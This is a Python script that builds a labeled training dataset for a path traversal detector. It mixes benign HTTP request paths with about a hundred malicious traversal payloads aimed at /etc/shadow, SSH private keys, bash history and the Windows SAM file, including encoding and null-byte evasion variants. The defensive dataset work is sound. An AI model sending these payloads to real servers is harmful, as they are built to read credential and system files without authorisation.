"""
================================================================================
BehavGuard – Path Traversal Dataset Builder
================================================================================
Builds a labeled dataset combining:
  - Real-world malicious payloads (OWASP, PayloadsAllTheThings, CSIC-inspired)
  - Realistic benign HTTP request paths
  - Various encoding variants to mimic real attacker evasion techniques
================================================================================
"""

import pandas as pd
import random
import urllib.parse

random.seed(42)

MALICIOUS_PAYLOADS = [
    "../../etc/passwd", "../../../etc/passwd", "../../../../etc/passwd",
    "../../../../../etc/passwd", "../../../../../../etc/passwd",
    "../../etc/shadow", "../../etc/hosts", "../../etc/hostname",
    "../../etc/group", "../../etc/fstab", "../../etc/crontab",
    "../../etc/issue", "../../etc/motd", "../../etc/resolv.conf",
    "../../proc/self/environ", "../../proc/self/cmdline", "../../proc/version",
    "../../var/log/apache2/access.log", "../../var/log/nginx/access.log",
    "../../var/log/auth.log", "../../var/www/html/config.php",
    "../../home/user/.ssh/id_rsa", "../../home/ubuntu/.bash_history",
    "../../root/.bash_history", "../../root/.ssh/authorized_keys",
    "..\\..\\windows\\system32\\drivers\\etc\\hosts", "..\\..\\..\\windows\\win.ini",
    "..\\..\\boot.ini", "../../windows/system32/drivers/etc/hosts",
    "../../windows/win.ini", "../../boot.ini",
    "..\\..\\windows\\system32\\config\\SAM", "../../windows/system32/config/SAM",
    "../../windows/repair/SAM", "../../winnt/win.ini",
    "..%2f..%2fetc%2fpasswd", "..%2f..%2f..%2fetc%2fpasswd",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd", "%2e%2e/%2e%2e/etc/passwd",
    "..%2fetc%2fpasswd", "..%2f..%2fetc%2fshadow",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252f..%252fetc%252fpasswd", "..%255c..%255cwindows%255cwin.ini",
    "%252e%252e%252fetc%252fpasswd",
    "..%c0%af..%c0%afetc%c0%afpasswd", "..%c1%9c..%c1%9cetc%c1%9cpasswd",
    "....//....//etc/passwd", "....\\\\....\\\\windows\\\\win.ini",
    "..././..././etc/passwd", "..././..././..././etc/passwd",
    "..\\..\\/etc/passwd", "/..%2f..%2fetc/passwd",
    "/%2e%2e/%2e%2e/etc/passwd", "..%5c..%5cwindows%5cwin.ini",
    "/etc/passwd", "/etc/shadow", "/etc/hosts", "/etc/group",
    "/proc/self/environ", "/var/log/apache2/access.log",
    "C:\\windows\\win.ini", "C:\\boot.ini",
    "../../etc/passwd%00", "../../etc/passwd%00.jpg", "../../etc/passwd%00.php",
    "../../etc/shadow%00.html",
    "..../..../etc/passwd", "....//....//....//etc/passwd",
    "..%2f%2e%2e%2fetc%2fpasswd", ".%2e/.%2e/etc/passwd", "%2e./%2e./etc/passwd",
    "/index.php?page=../../etc/passwd", "/view.php?file=../../../etc/shadow",
    "/download.php?filename=../../etc/passwd",
    "/load.php?template=../../../../etc/hosts",
    "/app.php?lang=../../etc/passwd%00",
    "/index.php?include=....//....//etc/passwd",
    "/read.php?path=/etc/passwd", "/file.php?name=..%2f..%2fetc%2fpasswd",
    "/api/v1/file?path=../../etc/passwd", "/admin/download?file=../../../etc/shadow",
    "/api/read?f=%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "/download?name=../../windows/win.ini", "/?file=..%2f..%2f..%2fetc%2fpasswd",
    "/view?page=../../etc/hosts", "/content?id=../../../etc/passwd",
    "/fetch?url=../../etc/shadow", "/load?module=../../proc/self/environ",
    "/get?resource=../../var/log/apache2/access.log",
    "/open?path=/etc/group", "/show?doc=../../etc/crontab",
    "/render?template=../../../etc/issue",
    "/api/file?path=../../home/user/.ssh/id_rsa",
    "/static/js?file=../../../etc/passwd",
    "/image?src=../../etc/shadow",
    "/data?input=..%252f..%252fetc%252fpasswd",
    "/include?name=../../../proc/version",
    "/config?file=../../etc/resolv.conf",
    "/report?path=../../var/log/auth.log",
    "/export?file=../../etc/fstab",
    "/view?name=../../root/.bash_history",
    "/api?p=..%c0%af..%c0%afetc%c0%afpasswd",
]

BENIGN_PATHS = [
    "/static/css/main.css", "/static/js/app.js", "/static/images/logo.png",
    "/static/fonts/roboto.woff2", "/favicon.ico", "/robots.txt", "/sitemap.xml",
    "/assets/vendor/bootstrap.min.css", "/assets/js/jquery-3.6.0.min.js",
    "/public/img/banner.jpg", "/media/uploads/profile_pic.jpg",
    "/cdn/icons/icon-192.png", "/static/docs/user-guide.pdf",
    "/api/v1/users", "/api/v1/users/42", "/api/v2/products",
    "/api/v2/products/search?q=laptop", "/api/v1/orders/12345",
    "/api/v1/auth/login", "/api/v1/auth/logout", "/api/v1/auth/refresh",
    "/api/v1/profile", "/api/v1/settings", "/api/v2/payments/checkout",
    "/api/health", "/api/status", "/api/v1/notifications",
    "/api/v1/messages/thread/89", "/api/v3/analytics/dashboard",
    "/api/v1/categories", "/api/v1/tags", "/api/v1/search?q=python&page=1",
    "/api/v1/comments/42",
    "/", "/home", "/about", "/contact", "/login", "/register",
    "/dashboard", "/profile", "/settings", "/help", "/faq",
    "/terms", "/privacy", "/blog", "/blog/post-123",
    "/blog/category/technology", "/blog/tag/security", "/news",
    "/news/article/456", "/products", "/products/laptop-pro-x",
    "/products/category/electronics", "/cart", "/checkout",
    "/orders", "/orders/history", "/orders/12345/track",
    "/admin/dashboard", "/admin/users", "/admin/reports", "/admin/settings",
    "/docs", "/docs/api", "/docs/getting-started", "/404", "/500",
    "/search?q=machine+learning&page=2",
    "/products?category=electronics&sort=price_asc",
    "/blog?page=3&limit=10", "/users?role=admin&active=true",
    "/reports?from=2024-01-01&to=2024-12-31",
    "/downloads/report_2024_q3.pdf", "/uploads/user_42/avatar.png",
    "/view?id=1001&format=json", "/export?type=csv&fields=name,email",
    "/content?lang=en&theme=dark", "/page?name=homepage&version=2",
    "/template?id=basic&color=blue", "/module?name=auth&action=verify",
    "/file?id=abc123&type=pdf", "/image?w=800&h=600&fit=cover",
    "/video?id=xyz789&quality=720p", "/stream?channel=main&format=hls",
    "/download?token=eyJhbGciOiJIUzI1NiJ9&file=report",
    "/resource?key=config_v2&env=production",
    "/data?source=analytics&period=monthly",
    "/v1/health", "/v2/users/me", "/app/dashboard", "/portal/login",
    "/console/overview", "/panel/reports", "/internal/metrics",
    "/webhook/github", "/callback/oauth", "/auth/google/callback",
    "/auth/github", "/sso/login", "/saml/acs", "/oidc/token",
]


def generate_variations(payloads, n=50):
    params = ["page", "file", "path", "template", "include", "name",
              "doc", "src", "resource", "load", "f", "q", "url", "id"]
    endpoints = ["/index.php", "/view.php", "/load.php", "/read.php",
                 "/api/file", "/fetch", "/get", "/open", "/render",
                 "/download", "/show", "/content", "/include"]
    extras = []
    for _ in range(n):
        payload = random.choice(payloads)
        param   = random.choice(params)
        endpoint = random.choice(endpoints)
        extras.append(f"{endpoint}?{param}={urllib.parse.quote(payload)}")
    return extras


def generate_benign_variations(paths, n=50):
    actions = ["view", "edit", "delete", "create", "update", "list"]
    extras = []
    for _ in range(n):
        path   = random.choice(paths)
        action = random.choice(actions)
        num    = random.randint(1, 9999)
        extras.append(f"{path}?action={action}&id={num}")
    return extras


def build_dataset():
    all_malicious = list(set(MALICIOUS_PAYLOADS + generate_variations(MALICIOUS_PAYLOADS, 50)))
    all_benign    = list(set(BENIGN_PATHS + generate_benign_variations(BENIGN_PATHS, 50)))

    mal_df = pd.DataFrame({"payload": all_malicious, "label": 1})
    ben_df = pd.DataFrame({"payload": all_benign,    "label": 0})

    df = pd.concat([mal_df, ben_df], ignore_index=True)
    df = df.sample(frac=1, random_state=42).reset_index(drop=True)
    return df


if __name__ == "__main__":
    df = build_dataset()
    out_path = "dataset/path_traversal_dataset.csv"
    df.to_csv(out_path, index=False)
    print(f"[OK] Dataset saved to {out_path}")
    print(f"     Total    : {len(df)}")
    print(f"     Malicious: {(df.label==1).sum()}")
    print(f"     Benign   : {(df.label==0).sum()}")
